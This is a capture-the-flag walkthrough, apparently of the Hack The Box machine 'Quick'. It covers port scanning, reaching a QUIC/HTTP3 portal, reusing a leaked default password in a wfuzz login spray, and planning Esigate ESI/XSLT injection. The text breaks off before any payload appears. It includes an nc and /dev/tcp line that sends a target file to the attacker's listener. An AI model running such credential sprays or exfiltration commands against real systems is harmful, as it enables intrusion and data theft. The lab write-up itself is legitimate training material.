---
title: Quick
date: 2026-05-08
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Nmap-analyzing-UDP
  - Port53-DNS-host-discovery-sourcecode
  - BruteForce-subdomain-wfuzz
  - Port443-UDP-QUIC
  - Linux-Privilege-docker-local-kali-file-transfer
  - BruteForce-account-wfuzz
  - OWASP-dataleak-email-login
  - Linux
  - hard
  - OWASP-X-Powered-By-Esigate
  - Port80-Apache-local-web-server-Configure
  - OWASP-XSLT-INJECT
  - Linux-Privilege-General-Enumeration
  - revshell-python-upgrade
  - Linux-Enumation-mysql
  - Source-Code-php-printer-add
  - Linux-Privilege-dataleak
lastmod: 2026-05-12T08:05:36.675Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Quick" >}}

***

# Recon

### PORT & IP SCAN

The full TCP port scan of **10.129.195.226** across all 65,535 ports revealed only **two open ports**: **SSH on port 22** and an unidentified service on **port 9001** (tentatively labelled `tor-orport` by Nmap, though this is likely a misidentification). The remaining ports were either closed (65,463 via TCP reset) or filtered with no response — the filtered ports are likely the result of a firewall or packet-filtering rule dropping traffic rather than actively rejecting it. With such a minimal attack surface, initial enumeration efforts should focus on banner-grabbing and service identification on port 9001 (e.g. via `nc` or `curl`) to determine what application is actually running there, while SSH on port 22 remains a secondary vector pending valid credentials or key material.

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/htb]
└─$ sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.195.226                 
[sudo] password for parallels: 
Sorry, try again.
[sudo] password for parallels: 
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-08 23:55 +0800
Initiating Ping Scan at 23:55
Scanning 10.129.195.226 [4 ports]
Completed Ping Scan at 23:55, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:55
Completed Parallel DNS resolution of 1 host. at 23:55, 0.51s elapsed
Initiating SYN Stealth Scan at 23:55
Scanning 10.129.195.226 [65535 ports]
Discovered open port 22/tcp on 10.129.195.226
Warning: 10.129.195.226 giving up on port because retransmission cap hit (2).
Discovered open port 9001/tcp on 10.129.195.226
Completed SYN Stealth Scan at 23:59, 271.27s elapsed (65535 total ports)
Nmap scan report for 10.129.195.226
Host is up, received echo-reply ttl 63 (0.045s latency).
Scanned at 2026-05-08 23:55:19 HKT for 271s
Not shown: 65463 closed tcp ports (reset)
PORT      STATE    SERVICE         REASON
22/tcp    open     ssh             syn-ack ttl 63
603/tcp   filtered mnotes          no-response
832/tcp   filtered netconfsoaphttp no-response
3181/tcp  filtered bmcpatrolagent  no-response
3509/tcp  filtered vt-ssl          no-response
5079/tcp  filtered cp-spxrpts      no-response
5969/tcp  filtered mppolicy-mgr    no-response
6747/tcp  filtered unknown         no-response
6896/tcp  filtered unknown         no-response
8544/tcp  filtered unknown         no-response
9001/tcp  open     tor-orport      syn-ack ttl 63
9092/tcp  filtered XmlIpcRegSvc    no-response
9130/tcp  filtered unknown         no-response
10300/tcp filtered unknown         no-response
11777/tcp filtered unknown         no-response
12787/tcp filtered unknown         no-response
14848/tcp filtered unknown         no-response
15089/tcp filtered unknown         no-response
16741/tcp filtered unknown         no-response
16956/tcp filtered unknown         no-response
18566/tcp filtered unknown         no-response
20496/tcp filtered unknown         no-response
22059/tcp filtered unknown         no-response
22084/tcp filtered unknown         no-response
22333/tcp filtered showcockpit-net no-response
23268/tcp filtered unknown         no-response
23294/tcp filtered 5afe-dir        no-response
23732/tcp filtered unknown         no-response
23872/tcp filtered unknown         no-response
26965/tcp filtered unknown         no-response
30183/tcp filtered unknown         no-response
30806/tcp filtered unknown         no-response
31027/tcp filtered unknown         no-response
31592/tcp filtered unknown         no-response
33203/tcp filtered unknown         no-response
34718/tcp filtered unknown         no-response
35911/tcp filtered unknown         no-response
37351/tcp filtered unknown         no-response
38135/tcp filtered unknown         no-response
38299/tcp filtered unknown         no-response
40196/tcp filtered unknown         no-response
40320/tcp filtered unknown         no-response
40973/tcp filtered unknown         no-response
41024/tcp filtered unknown         no-response
41466/tcp filtered unknown         no-response
42031/tcp filtered unknown         no-response
42247/tcp filtered unknown         no-response
43743/tcp filtered unknown         no-response
44576/tcp filtered unknown         no-response
44666/tcp filtered unknown         no-response
45138/tcp filtered unknown         no-response
45613/tcp filtered unknown         no-response
45996/tcp filtered unknown         no-response
48977/tcp filtered unknown         no-response
49903/tcp filtered unknown         no-response
51369/tcp filtered unknown         no-response
51806/tcp filtered unknown         no-response
53091/tcp filtered unknown         no-response
54561/tcp filtered unknown         no-response
54845/tcp filtered unknown         no-response
55668/tcp filtered unknown         no-response
56891/tcp filtered unknown         no-response
57228/tcp filtered unknown         no-response
60559/tcp filtered unknown         no-response
61389/tcp filtered unknown         no-response
61551/tcp filtered unknown         no-response
61818/tcp filtered unknown         no-response
61995/tcp filtered unknown         no-response
62195/tcp filtered unknown         no-response
63378/tcp filtered unknown         no-response
64221/tcp filtered unknown         no-response
64446/tcp filtered unknown         no-response

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 271.95 seconds
           Raw packets sent: 82488 (3.629MB) | Rcvd: 82485 (3.299MB)
                                                                                    
```

Only 2 port is opened

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/htb]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.195.226  -oN serviceScan.txt

Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-09 00:02 +0800
Nmap scan report for 10.129.195.226
Host is up (0.065s latency).
Not shown: 70 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Quick | Broadband Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.58 seconds

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Nmap-analyzing-UDP" >}} The UDP scan targeting the **top 100 most common UDP ports** on **10.129.195.226** surfaced two ports in an **open|filtered** state: **port 68 (DHCP client)** and **port 443 (HTTPS)**. The `open|filtered` status means Nmap couldn't definitively determine whether these ports are open or being silently dropped by a firewall — a common ambiguity in UDP scanning since UDP receives no response on open ports. Port 68 is almost certainly a false positive, as it is a client-side DHCP port unlikely to be intentionally exposed on a server. **Port 443/UDP** is the more interesting finding — it strongly suggests **QUIC or DTLS** may be running (e.g. a web service leveraging HTTP/3 over QUIC), which aligns with the unidentified service on TCP 9001 seen earlier and warrants further probing with tools like `curl --http3` or `quic-client` to confirm.

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/htb]
└─$ sudo nmap -sU --top-port=100 10.129.195.226
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-09 00:04 +0800
Nmap scan report for 10.129.195.226
Host is up (0.24s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
443/udp open|filtered https

Nmap done: 1 IP address (1 host up) scanned in 119.45 seconds
```

### TCP 9001

![Pasted image 20260511110758.png](/ob/Pasted%20image%2020260511110758.png)

![Pasted image 20260511110744.png](/ob/Pasted%20image%2020260511110744.png)

#### SourceCode

```

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Quick | Broadband Services</title>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'>
<style>
body{
  padding: 0;
  margin: 0;
  font-family: Arial, Helvetica, sans-serif;
}
section.cover{
  background: linear-gradient(45deg,#151680 50%,#261681 50%);
  padding: 20px 10%;
	border-bottom: 50px solid transparent;
  border-bottom-left-radius: 20px;
  border-bottom-right-radius: 20px;
}
section nav{
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 1.4rem;
  color: #fff;
}
section nav ul{
  list-style-type: none;
  font-size: 0.8rem;
}
section nav ul li {
  float: left;
  padding: 10px;
}
.ghost-btn{
  margin: 0 10px;
  padding: 10px;
  border: 1px solid #fff;
  border-radius: 5px;
}
div.cta-btn{
  margin: 40px 0 20px 0;
}
div.cta-btn a{
  padding: 10px 20px;
  background-color: #D20B54;
  text-decoration: none;
  color: #fff;
  border-radius: 5px;
}
section.cover .content .heading{
  font-size: 2.5rem;
  font-weight: 500;
}
section.cover .content{
  color: #fff;
  padding: 40px 0;
  position: relative;
}
section.cover .content .highlight{
  font-size: 10px;
}
section.cover .content .card{
  position: absolute;
  bottom: 10px;
  right: 0;
  width: 440px;
  padding: 20px 40px;
  background-color: #fff;
  color: #888;
  border-radius: 5px;
  transition: 200ms all ease-in-out;
  cursor: pointer;
}
section.cover .content .card:hover{
  transform: translateY(-5px);
  color: #222;
}
</style>
<script>
  window.console = window.console || function(t) {};
</script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<section class="cover">
<nav>
<span class="logo">
Quick
</span>
<ul>
<li>About</li>
<li>Contact</li>
</ul>
</nav>
<div class="content">
<h2 class="heading">New Broadband Services in JetSpeed<br />for all your Need.</h2>
<p>Upto 17MBps - £18 | Upto 50MBps - £27</p>
<div class="cta-btn">
<a href="/login.php">Get Started</a>
</div>
<p class="highlight">30 day trial | No Bandwidth limit</p>
<div class="card">
<h2>Update!</h2>
<p>We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our <a href="https://portal.quick.htb">portal</a><br />
<br />You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App</p>
</div>
</div>
</section>
<center>
<br />
<table border="0" width="50%"><tr><th style="font-size:180%;" colspan="2">Testimonals!<br /><br /></th></tr>
<tr><td><br />Super fast services by Quick Broadband Services. I love their service.</td><td> --By Tim (Qconsulting Pvt Ltd)</td></tr>
<tr><td><br />Quick support and eligant chat response.</td><td> --By Roy (DarkWng Solutions)</td></tr>
<tr><td><br />I never regret using Quick services. Super fast wifi and no issues.</td><td> --By Elisa (Wink Media)</td></tr>
<tr><td><br />Very good delivery and support all these years.</td><td> --By James (LazyCoop Pvt Ltd)</td></tr></table>
<center><br /><br />Check our <a href="/clients.php">clients</a>
</body>
</html>
```

Discovering the `/login.php` and `/clients.php`

#### /clients.php

This page returns a list of the clients:\
![Pasted image 20260511111145.png](/ob/Pasted%20image%2020260511111145.png)

#### /login.php

This page presents a login form:\
![Pasted image 20260511111704.png](/ob/Pasted%20image%2020260511111704.png)\
Nothing obvious either in guessing or in SQLi worked, so moving on for now.

#### portal.quick.htb

{{< toggle "Tag 🏷️" >}}

{{< tag "Port53-DNS-host-discovery-sourcecode" >}} Discovery the subdomain of portal.quick.htb in the source code ,and then add into the /etc/hosts

{{< /toggle >}}

```
div class="card">
<h2>Update!</h2>
<p>We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our <a href="https://portal.quick.htb">portal</a><br />
<br />You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App</p>
</div>
</div>
```

{{< code >}}\
127.0.0.1       localhost\
127.0.1.1       kali\
::1             localhost ip6-localhost ip6-loopback\
ff02::1         ip6-allnodes\
ff02::2         ip6-allrouters\
10.129.188.68   portal.quick.htb quick.htb\
{{< /code >}}

{{< toggle "Tag 🏷️" >}}

{{< tag "BruteForce-subdomain-wfuzz" >}} Given the link above, I’ll add both portal.quick.htb and quick.htb to my /etc/hosts file. I’ll also use wfuzz to look for more with the following command, but nothing found.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop/htb/quick]
└─# wfuzz -c -u http://10.129.188.68:9001 -H "Host: FUZZ.quick.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 3351
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.188.68:9001/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================


Total time: 95.69305
Processed Requests: 220
Filtered Requests: 220
Requests/sec.: 2.299017
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received

```

It didn’t find anything.

### UDP 443 QUIC

> QUIC (Quick UDP Internet Connections) is ==a modern, high-performance transport layer protocol designed to reduce internet latency and improve connection security over UDP==. Initially developed by Google, it is now an IETF standard (RFC 9000) and serves as the foundation for HTTP/3, aiming to replace TCP for faster web browsing and streaming.

This is where some knowledge of new tech is useful. While most standard HTTP today is version 1.1 ([standardized](https://tools.ietf.org/html/rfc2068) in 1997), there has been a push to move to more modern protocols. HTTP/2 was proposed in 2014 and released as a [standard](https://tools.ietf.org/html/rfc7540) in 2015. In 2012, Google created [QUIC](https://en.wikipedia.org/wiki/QUIC), a general purpose transport layer protocol. [This post](https://blog.apnic.net/2019/03/04/a-quick-look-at-quic/) from APNIC was a useful overview, and included these two images that show how QUIC compares to typical HTTPS over TCP:

{{< toggle "Tag 🏷️" >}}

{{< tag "Port443-UDP-QUIC" >}} While reading up on HTTP/3 and determining if a site supports it or not I found the site <https://geekflare.com/http3-test/>. It mentioned a version of cURL that can be built from source that supports this protocol, so I downloaded the code from the GitHub repository at <https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version> and followed the instructions.

{{< /toggle >}}

## Build

```
┌──(root㉿kali)-[~/Desktop]
└─# docker run -it --rm ymuski/curl-http3 curl -V

Unable to find image 'ymuski/curl-http3:latest' locally
latest: Pulling from ymuski/curl-http3
52d2b7f179e3: Pull complete 
9f6736c40033: Pull complete 
4e65c0357ae0: Pull complete 
90c9e0b34d74: Pull complete 
e7af63d26766: Pull complete 
4f4fb700ef54: Pull complete 
202954d0923f: Pull complete 
Digest: sha256:9eadfcaa6e541ef61880795c3044f7a603dd62fe5be5a3b45b5e154025c783de
Status: Downloaded newer image for ymuski/curl-http3:latest
curl 8.2.1-DEV (x86_64-pc-linux-gnu) libcurl/8.2.1-DEV BoringSSL zlib/1.2.13 nghttp2/1.52.0 quiche/0.18.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS HSTS HTTP2 HTTP3 HTTPS-proxy IPv6 Largefile libz NTLM NTLM_WB SSL threadsafe UnixSockets
                                           
```

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo docker run --net host --privileged -it --rm ymuski/curl-http3 /bin/bash
root@kali:/opt#
```

#### index.php

```
root@portal:/opt#  curl --http3 https://10.129.188.68/
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
root@portal:/opt#  curl --http3 https://10.129.188.68/ -k 

<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<head>
<style>
ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

/* Change the link color on hover */
li a:hover {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>
root@portal:/opt# 

```

#### contact.php

```
root@portal:/opt#  curl --http3 https://10.129.188.68/ -k 

<html>
<title> Quick | Customer Portal</title>
<h1>Quick | Portal</h1>
<head>
<style>
ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 200px;
  background-color: #f1f1f1;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

/* Change the link color on hover */
li a:hover {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>
<p> Welcome to Quick User Portal</p>
<ul>
  <li><a href="index.php">Home</a></li>
  <li><a href="index.php?view=contact">Contact</a></li>
  <li><a href="index.php?view=about">About</a></li>
  <li><a href="index.php?view=docs">References</a></li>
</ul>
</html>
root@portal:/opt#  curl --http3 https://10.129.188.68/index.php?view=contact -k 
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
* {box-sizing: border-box;}

input[type=text], select, textarea {
  width: 100%;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
  margin-top: 6px;
  margin-bottom: 16px;
  resize: vertical;
}

input[type=submit] {
  background-color: #4CAF50;
  color: white;
  padding: 12px 20px;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

input[type=submit]:hover {
  background-color: #45a049;
}

.container {
  border-radius: 5px;
  background-color: #f2f2f2;
  padding: 20px;
}
</style>
</head>
<body>
<h1>Quick | Contact</h1>

<div class="container">
  <form action="/">
    <label for="fname">First Name</label>
    <input type="text" id="fname" name="firstname" placeholder="Your name..">

    <label for="lname">Last Name</label>
    <input type="text" id="lname" name="lastname" placeholder="Your last name..">

    <label for="country">Country</label>
    <select id="country" name="country">
      <option value="australia">Australia</option>
      <option value="canada">Canada</option>
      <option value="usa">USA</option>
    </select>

    <label for="subject">Subject</label>
    <textarea id="subject" name="subject" placeholder="Write something.." style="height:200px"></textarea>

    <input type="submit" value="Submit">
  </form>
</div>

</body>
</html>

```

#### about.php

```
root@portal:/opt#  curl --http3 https://10.129.188.68/index.php?view=about
curl: (60) SSL certificate problem: self signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the web page mentioned above.
root@portal:/opt#  curl --http3 https://10.129.188.68/index.php?view=about
^[[A^C
root@portal:/opt# ^C
root@portal:/opt#  curl --http3 https://10.129.188.68/index.php?view=about -k 
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  margin: 0;
}

html {
  box-sizing: border-box;
}

*, *:before, *:after {
  box-sizing: inherit;
}

.column {
  float: left;
  width: 33.3%;
  margin-bottom: 16px;
  padding: 0 8px;
}

.card {
  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
  margin: 8px;
}

.about-section {
  padding: 50px;
  text-align: center;
  background-color: #474e5d;
  color: white;
}

.container {
  padding: 0 16px;
}

.container::after, .row::after {
  content: "";
  clear: both;
  display: table;
}

.title {
  color: grey;
}

.button {
  border: none;
  outline: 0;
  display: inline-block;
  padding: 8px;
  color: white;
  background-color: #000;
  text-align: center;
  cursor: pointer;
  width: 100%;
}

.button:hover {
  background-color: #555;
}

@media screen and (max-width: 650px) {
  .column {
    width: 100%;
    display: block;
  }
}
</style>
</head>
<body>

<div class="about-section">
  <h1>Quick | About Us </h1>
</div>

<h2 style="text-align:center">Our Team</h2>
<div class="row">
  <div class="column">
    <div class="card">
      <img src="/w3images/team1.jpg" alt="Jane" style="width:100%">
      <div class="container">
        <h2>Jane Doe</h2>
        <p class="title">CEO & Founder</p>
        <p>Quick Broadband services established in 2012 by Jane.</p>
        <p>jane@quick.htb</p>
      </div>
    </div>
  </div>

  <div class="column">
    <div class="card">
      <img src="/w3images/team2.jpg" alt="Mike" style="width:100%">
      <div class="container">
        <h2>Mike Ross</h2>
        <p class="title">Sales Manager</p>
        <p>Manages the sales and services.</p>
        <p>mike@quick.htb</p>
      </div>
    </div>
  </div>
  
  <div class="column">
    <div class="card">
      <img src="/w3images/team3.jpg" alt="John" style="width:100%">
      <div class="container">
        <h2>John Doe</h2>
        <p class="title">Web Designer</p>
        <p>Front end developer.</p>
        <p>john@quick.htb</p>
      </div>
    </div>
  </div>
</div>

</body>
</html>
root@portal:/opt# 
```

#### docs.php

```
root@portal:/opt#  curl --http3 https://10.129.188.68/index.php?view=docs -k 
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">

<h1>Quick | References</h1>
<ul>
  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>
  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>
</ul>
</head>
</html>
```

#### QuickStart.pdf & Connectivity.pdf

```
root@portal:/opt#  curl --http3 https://10.129.188.68/docs/QuickStart.pdf -k -o QuickStart.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  228k  100  228k    0     0   364k      0 --:--:-- --:--:-- --:--:--  364k

root@portal:/opt#  curl --http3 https://portal.quick.htb/docs/Connectivity.pdf -k -o Connectivity.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 83830  100 83830    0     0  14784      0  0:00:05  0:00:05 --:--:-- 12320
```

I need try a few time (10 time of try ) to download it

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-docker-local-kali-file-transfer" >}} Transfer a file using Netcat or called nc and /dev/tcp to exfiltrate documents from the target machine for local analysis.

{{< /toggle >}}

**1. On your Local Kali Terminal:**

```
nc -lvnp 9001 > ~/Desktop/Connectivity.pdf
```

**2. On the Portal (Target) Terminal:**

```
cat /opt/Connectivity.pdf > /dev/tcp/10.10.16.48/9001
```

### PDF

![Pasted image 20260511140756.png](/ob/Pasted%20image%2020260511140756.png)

#### Password

found the `Quick4cc3$$` as the password

```
1. Once router is up and running just navigate to http://172.15.0.4/quick_login.jsp
2. You can use your registered email address and Quick4cc3$$ as password.
3. Login and change your password for WiFi and ticketing system.
4. Don’t forget to ping us on chat whenever there is an issue.
```

# Shell assam

### Panel Login

I’ll use the password I found in the PDF above to try to log into the TCP 9001 site. I tried the email addresses from the about page on the QUIC site, but it didn’t work. Since this is a client login, I remembered the testimonials on the front page, which were from:

From the about php page\
1\. -> jane@quick.htb\
2\. -> mike@quick.htb\
3\. -> john@quick.htb

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-dataleak-email-login" >}} The index php show the name who is possible to build the email list for account enumerating, first create the base list and use wfuzz to do the post request of account bruteforce. By identifying the naming convention on the index page and pairing it with a common (or discovered) password

{{< /toggle >}}

![Pasted image 20260511142946.png](/ob/Pasted%20image%2020260511142946.png)

The main page already leaks usernames. To get full email addresses, we need some more information first.\
![Pasted image 20260511142719.png](/ob/Pasted%20image%2020260511142719.png)

With this information a simple wordlist can be created:

```
┌──(root㉿kali)-[~/Desktop]
└─# cat mails.txt 
tim@qconsulting.co.uk
roy@darkwing.us
elisa@wink.co.uk
james@lazycoop.cn

```

{{< toggle "Tag 🏷️" >}}

{{< tag "BruteForce-account-wfuzz" >}} Using wfuzz, all emails with the found password can be checked.

{{< /toggle >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# wfuzz -X POST -u quick.htb:9001/login.php -d 'email=FUZZ&password=Quick4cc3$$' -w mails.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://quick.htb:9001/login.php
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000004:   200        0 L      2 W        80 Ch       "james@lazycoop.cn"                                
000000002:   200        0 L      2 W        80 Ch       "roy@darkwing.us"                                  
000000001:   200        0 L      2 W        80 Ch       "tim@qconsulting.co.uk"                            
000000003:   302        0 L      0 W        0 Ch        "elisa@wink.co.uk"                                 

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0
```

![Pasted image 20260511144108.png](/ob/Pasted%20image%2020260511144108.png)

The only two functional elements on the page that I could find were the search button and the Raise Ticket link.

#### Raise Ticket

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-X-Powered-By-Esigate" >}} I noticed in all the responses coming back is a pair of headers:ESIGate devices are surrogates that handle caching of content and support the ESI web standard. The [Via header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via) is added by proxies. Based on this, I can assume that Esigate is running on localhost doing this ESI proxying.

{{< /toggle >}}

Raise Ticket leads to a form:

![Pasted image 20260511144339.png](/ob/Pasted%20image%2020260511144339.png)\
Looking at the POST request, it submits not only `title` and `msg`, but also `PHPSESSUIONID`:

![Pasted image 20260511144530.png](/ob/Pasted%20image%2020260511144530.png)

It looks like when I GET `ticket.php`, the `id` for the new ticket is sent down as a hidden field in the form. As far as I can tell, the four digit number is completely random.

![Pasted image 20260511145103.png](/ob/Pasted%20image%2020260511145103.png)

```
Via: 1.1 localhost (Apache-HttpClient/4.5.2 (cache))
X-Powered-By: Esigate
```

One other thing I noticed in all the responses coming back is a pair of headers:

ESIGate devices are surrogates that handle caching of content and support the ESI web standard. The [Via header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via) is added by proxies. Based on this, I can assume that Esigate is running on localhost doing this ESI proxying.\*\*\*\*

Edge-Side Include (ESI) is a web standard that allows an edge device to cache a page with some static content. [This blog](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) uses the example of a weather page that might look like this:

```
<body>
  <b>The Weather Website</b>
  Weather for <esi:include src="/weather/name?id=$(QUERY_STRING{city_id})" />
  Monday: <esi:include src="/weather/week/monday?id=$(QUERY_STRING{city_id})" />
  Tuesday: <esi:include src="/weather/week/tuesday?id=$(QUERY_STRING{city_id})" />

```

So the edge caching device would cache the page just like this. And when someone requests the page, it will replace the <esi:include> tags by making the necessary calls itself.

The risk here is that if an attacker can submit something that will be processed by the server, and result in an ESI tag included in the response, the edge device will then process that and make the requests that the attacker wanted, as the edge device thinks it’s coming from the web server. The blog post above shows how this can be used for server-side request forgery (SSRF), bypassing client-side cross site scripting (XSS) filters, and (in the second post) using XSLT to get code execution. The example used for the last one is against ESIGate devices!

#### Configure Apache

{{< toggle "Tag 🏷️" >}}

{{< tag "Port80-Apache-local-web-server-Configure" >}}  I always use python3 -m http.server 80 to serve files from my host, but there are some things that get wonky here, and I found it easier to use Apache. To start Apache on Kali, all I had to run was service apache2 restart. I didn’t want Apache to send 304 responses (content not modified), so I disabled that by putting the following at the bottom of /etc/apache2/apache2.conf for me to drop any files into /var/www/html and they are served.

{{< /toggle >}}

Use the `vim` to put these content to `/etc/apache2/apache2.conf`

{{< code >}}\
RequestHeader unset Last-Modified\
RequestHeader unset If-None-Match\
RequestHeader unset If-Modified-Since\
{{< /code >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# cp /etc/apache2/apache2.conf /etc/apache2/apache2.conf.bk

┌──(root㉿kali)-[~/Desktop]
└─# tail -n 10 /etc/apache2/apache2.conf 
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf
RequestHeader unset Last-Modified
RequestHeader unset If-None-Match
RequestHeader unset If-Modified-Since
   
```

restart the apache

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo a2enmod headers
Enabling module headers.
To activate the new configuration, you need to run:
  systemctl restart apache2
                                                                                                                                                                                 
┌──(root㉿kali)-[~/Desktop]
└─# systemctl restart apache2

```

```
┌──(root㉿kali)-[~/Desktop]
└─# systemctl status apache2.service
○ apache2.service - The Apache HTTP Server
     Loaded: loaded (/usr/lib/systemd/system/apache2.service; disabled; preset: disabled)
     Active: inactive (dead)
       Docs: https://httpd.apache.org/docs/2.4/
                                                      
```

Now I can drop files into `/var/www/html` and they are served.

If you choose not to use Apache, but rather want to stick with Python, the biggest issue is that it seems the second time the edge software requests a file, instead of sending a normal `GET /file HTTP/1.1`, it sends `GET http://10.10.14.47/file HTTP/1.1`. This breaks the Python web server. I can get around that by changing the name of the file or the port it is hosted on each time, but that’s a pain, and why I went with Apache.

#### Injection POC

{{< toggle "Tag 🏷️" >}}

{{< tag "OWASP-XSLT-INJECT" >}} Edge-Side Include (ESI) is a web standard that allows an edge device to cache a page with some static content. So the edge caching device would cache the page just like this. And when someone requests the page, it will replace the `<esi:include>` tags by making the necessary calls itself.The risk here is that if an attacker can submit something that will be processed by the server, and result in an ESI tag included in the response, the edge device will then process that and make the requests that the attacker wanted, as the edge device thinks it’s coming from the web server. The blog post above shows how this can be used for server-side request forgery (SSRF), bypassing client-side cross site scripting (XSS) filters, and (in the second post) using XSLT to get code execution. The example used for the last one is against ESIGate devices! And Base on that POC to do the RCE.

{{< /toggle >}}

[This blog](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) uses the example of a weather page that might look like this:

To pull this off, I have to think about what content I can submit to this page that might be sent back to me through the edge. There are two places I could think of:

1. When I submit a ticket, I send in the ticket ID, and it is displayed right back to me in the JavaScript alert.
